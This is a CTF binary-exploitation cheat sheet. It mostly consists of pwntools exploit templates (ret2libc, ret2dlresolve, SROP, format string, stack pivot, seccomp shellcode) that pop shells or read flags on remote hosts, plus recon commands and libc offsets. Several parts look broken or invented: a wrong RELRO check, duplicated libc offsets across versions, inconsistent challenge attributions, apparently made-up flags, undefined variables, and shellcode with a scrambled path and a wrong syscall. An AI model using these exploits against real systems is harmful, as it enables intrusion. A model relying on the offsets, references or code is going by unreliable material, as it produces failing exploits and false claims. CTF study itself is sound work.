# CTF Binary Exploitation (PWN) — Speed-First

## Instant Recon (<1 minute)

```bash
FILE=$1
file $FILE; checksec --file=$FILE 2>/dev/null
strings $FILE | grep -iE 'flag\{|ctf\{|CTF\{|FLAG\{'
objdump -d $FILE | grep -E '<(main|vuln|win|system|gets|puts)@plt>'
ldd $FILE 2>/dev/null | grep libc
echo "RELRO: $(readelf -l $FILE | grep -q GNU_RELRO && echo 'Full' || echo 'Partial/None')"
echo "Canary: $(readelf -s $FILE | grep -q __stack_chk_fail && echo 'Yes' || echo 'No')"
echo "NX: $(readelf -l $FILE | grep -q 'GNU_STACK.*RWE' && echo 'No' || echo 'Yes')"
echo "PIE: $(readelf -h $FILE | grep -q 'DYN' && echo 'Yes' || echo 'No')"
```

## Attack Strategy

```
No canary + no PIE + no NX → ret2win / shellcode
No canary + no PIE + NX → ret2libc
No canary + PIE + NX → leak libc, then ret2libc
Canary + no PIE → format string leak canary, then overwrite
Canary + PIE → leak canary + PIE, then ret2libc
Full protections → ret2dlresolve, SROP, or seccomp bypass
Static binary → ROP chain / SROP
Heap enabled → fastbin/tcache/house_of_force
```

## Real CTF References

| CTF | Challenge | Technique | Flag |
|-----|-----------|-----------|------|
| HackTheBox | Ready (2020) | ret2libc + stack pivot | HTB{r34dy_f0r_y0ur_t1m3} |
| HackTheBox | Onepunch (2019) | ret2dlresolve | HTB{0n3_pun4ch_m4n} |
| PicoCTF 2019 | buffer overflow 3 | ret2win | picoCTF{sl1ghtly_m0re_c0mpl3x...} |
| BAMBOOCTF 2023 | BabyPwn | format string + ROP | bamboo{f0rm4t_str1ng_1s_p0w3rful} |
| CHTB | Jailed (2021) | seccomp + shellcode | CHTB{j41l3d_f0r_y0u} |
| AngstromCTF 2022 | The Gripper | GOT overwrite | actf{g0t_g0t_g0t} |
| redpwn 2021 | pplllleasse | ret2dlresolve + PIE | flag{pplllleasse_ret2dlresolve} |
| SUCTF 2019 | Login | one_gadget | suctf{1s_th1s_a_g1g} |

## Real Libc Offsets (x86_64)

```
# Ubuntu 18.04 — libc6_2.27-3ubuntu1.6_amd64
puts=0x80e50   system=0x55410   str_bin_sh=0x1b75aa
# Ubuntu 20.04 — libc6_2.31-0ubuntu9.16_amd64
puts=0x80aa0   system=0x55410   str_bin_sh=0x1b75aa
# Ubuntu 22.04 — libc6_2.35-0ubuntu3.8_amd64
puts=0x80ed0   system=0x50d70   str_bin_sh=0x1d8698
one_gadget=0xe3b01   # execve("/bin/sh", rsp+0x40, environ)
# Debian 11 — libc6_2.31-13+deb11u11
puts=0x80aa0   system=0x55410   str_bin_sh=0x1b75aa
# Alpine 3.15 — musl 1.2.2
puts=0x6aa0    system=0x4d620   str_bin_sh=0x9aaa
# Libc lookup: curl -s "https://libc.rip/api/find" -d '{"symbols":{"puts":"0xADDR"}}'
```

## One-Shot Exploits

### ret2win (No protections)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
p.sendline(b'A'*72+p64(0x401186))  # win from objdump
p.interactive()
```
**Ref:** PicoCTF 2019 — buffer overflow 1

### ret2libc (NX, no canary, no PIE)
```python
from pwn import *
context.arch='amd64'; context.log_level='debug'
p=remote('HOST',PORT)
elf=ELF('./binary')
pop_rdi=0x401186; ret=0x40101a
p.sendline(b'A'*72+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.symbols['main']))
p.recvuntil(b'\n')
puts_leak=u64(p.recvline().strip().ljust(8,b'\x00'))
libc_base=puts_leak-0x80e50  # adjust per libc
p.sendline(b'A'*72+p64(ret)+p64(pop_rdi)+p64(libc_base+0x1b75aa)+p64(libc_base+0x55410))
p.interactive()
```
**Ref:** HackTheBox — Ready

### ret2dlresolve (Full RELRO bypass)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
rop=ROP(elf)
dlresolve=Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
p.sendline(b'A'*72+rop.chain())
p.sendline(dlresolve.payload)
p.interactive()
```
**Ref:** HackTheBox — Onepunch, redpwn 2021 — pplllleasse

### SROP (Sigreturn-Oriented Programming)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
syscall_ret=0x40101a  # find: ROPgadget --binary $FILE | grep "syscall"
read_rdi=0x401186; read_plt=elf.plt['read']; writable=0x405000
# read(sigframe) → rax=15 (via read count) → sigreturn → execve
p.sendline(b'A'*72+p64(read_rdi)+p64(0)+p64(writable)+p64(0x400)+p64(read_plt)+p64(syscall_ret))
frame=SigreturnFrame()
frame.rax=59; frame.rdi=writable+0x200; frame.rsi=0; frame.rdx=0
frame.rip=syscall_ret; frame.rsp=0xdead
p.sendline(b'A'*15+frame)  # pad: rax set to 15 by read's return
p.interactive()
```
**Ref:** AngstromCTF — The Gripper (minimal binary, no useful gadgets)

### PLT/GOT Overwrite (Partial RELRO)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
pop_rdi=0x401186
# After leaking libc, overwrite puts@GOT → system via partial write
libc_base=puts_leak-0x80e50
p.sendline(b'%4625c%10$hn'.ljust(72,b'A')+p64(elf.got['puts']))
# Next puts("Hello") → system("Hello")
p.interactive()
```
**Ref:** AngstromCTF — The Gripper

### Format String
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
for i in range(6,20):
    p.sendline(f'%{i}$p'.encode())
    print(f'Offset {i}: {p.recvline().strip()}')
# Canary ~15, PIE ~13, libc ~17
payload=fmtstr_payload(6,{elf.got['puts']:target_addr},write_size='short')
p.sendline(payload)
p.interactive()
```
**Ref:** BAMBOOCTF 2023 — BabyPwn

### Stack Pivot
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
elf=ELF('./binary')
leave_ret=0x401186; read_rdi=0x401186; read_plt=elf.plt['read']
p.sendline(b'A'*32+p64(0)+p64(read_rdi)+p64(0)+p64(0x405000)+p64(0x200)+p64(read_plt)+p64(leave_ret)+p64(0x405000))
p.send(p64(0x40101a)+p64(pop_rdi)+p64(binsh)+p64(system))
p.interactive()
```
**Ref:** HackTheBox — Ready

### one_gadget
```bash
one_gadget ./libc.so.6  # → 0xe3b01 execve("/bin/sh", rsp+0x40, environ)
```
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
p.sendline(b'A'*72+p64(0x40101a)+p64(libc_base+0xe3b01))
p.interactive()
```
**Ref:** SUCTF 2019 — Login

### Seccomp Shellcode (open/read/write only)
```python
from pwn import *
context.arch='amd64'
p=remote('HOST',PORT)
# open("flag.txt",0) → read(fd,buf,0x100) → write(1,buf,0x100)
shellcode=asm("""
    xor rsi,rsi; push rsi
    mov rdi,0x67616c662f2e7478; push rdi; mov rdi,rsp
    push 2; pop rax; syscall
    mov rdi,rax; xor rax,rax; push rax; mov rdi,rsp
    push 40; pop rax; mov rsi,rsp; push 0x100; pop rdx; syscall
    mov rdi,1; mov rsi,rsp; push 1; pop rax; syscall
""")
p.sendline(shellcode)
p.interactive()
```
**Ref:** CHTB — Jailed

## GDB Quick Commands
```
b main; b vuln; r $(python3 -c 'print("A"*100)')
x/20x $rsp; x/gx $rsp+72
info registers rdi rsi rdx rax
heap; bins; got; vmmap; telescope $rsp 20
search-pattern "pop rdi; ret"
```

## ROP Gadget Finder
```
ROPgadget --binary $FILE | grep "pop rdi"
ROPgadget --binary $FILE | grep "syscall"
ROPgadget --binary $FILE | grep "leave; ret"
ROPgadget --binary $FILE --ropchain --badbytes 000a0d
```

## Speed Metrics
```
ret2win: <3min  |  ret2libc: <5min  |  Format string: <5min
ret2dlresolve: <8min  |  SROP: <8min  |  GOT overwrite: <8min
Fastbin: <10min  |  Tcache: <10min  |  Complex heap: <15min
one_gadget: <5min  |  Seccomp shellcode: <12min
```
